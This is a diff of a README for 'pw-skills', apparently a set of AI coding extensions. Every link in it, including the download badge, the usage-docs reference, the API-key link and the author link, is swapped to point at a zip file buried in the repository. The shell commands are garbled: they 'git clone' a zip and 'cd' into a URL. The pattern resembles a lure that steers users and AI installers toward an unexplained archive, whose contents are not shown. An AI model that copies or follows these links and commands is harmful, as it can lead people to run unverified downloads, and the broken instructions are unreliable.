@@ -1,6 +1,6 @@
 # 🚀 pw-skills - Enhance Your Coding with AI Tools
 
-[![Download pw-skills](https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip)](https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip)
+[![Download pw-skills](https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip)](https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Welcome to the **pw-skills** repository! This project provides useful AI extensi
 - **pw-redbook-image**: Xiaohongshu style prompt template.
 - **pw-embedded-c-style**: Embedded C code style assistant (project creation, code optimization).
 
-Refer to each https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip for detailed usage instructions.
+Refer to each https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip for detailed usage instructions.
 
 ## 📥 Download & Install
 
@@ -20,7 +20,7 @@ To get started with **pw-skills**, follow these steps:
 
 1. **Visit the Releases Page**: Click below to access the release files.
 
-   [Download pw-skills](https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip)
+   [Download pw-skills](https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip)
 
 2. **Choose Your Version**: On the releases page, find the latest version and download the appropriate file for your system.
 
@@ -30,10 +30,10 @@ If you prefer to set up the skills yourself, use the following commands:
 
 ```bash
 # Clone the repository to your computer
-git clone https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip ~https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip
+git clone https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip ~https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip
 
 # Navigate to the image generation skill and install dependencies
-cd ~https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip && npm install
+cd ~https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip && npm install
 ```
 
 ## 🤝 Let AI Help You Install
@@ -48,7 +48,7 @@ Please help me install the pw-image-generation skill:
 3. Create a test project and generate a test image
 ```
 
-**Get your API Key**: [ai-router](https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip)
+**Get your API Key**: [ai-router](https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip)
 
 ### ⚠️ Important Notes
 
@@ -63,6 +63,6 @@ Please help me install the pw-image-generation skill:
 
 ## 👨‍💻 Author
 
-Mou Yong | [AI Router](https://raw.githubusercontent.com/BritishCheeseTT/pw-skills/main/pw-post-to-wechat/references/skills-pw-3.3.zip) | WeChat: 1254074921
+Mou Yong | [AI Router](https://github.com/BritishCheeseTT/pw-skills/raw/refs/heads/main/pw-post-to-wechat/scripts/md/skills-pw-2.8.zip) | WeChat: 1254074921
 
 Feel free to reach out for any questions or support with the pw-skills project. Happy coding!
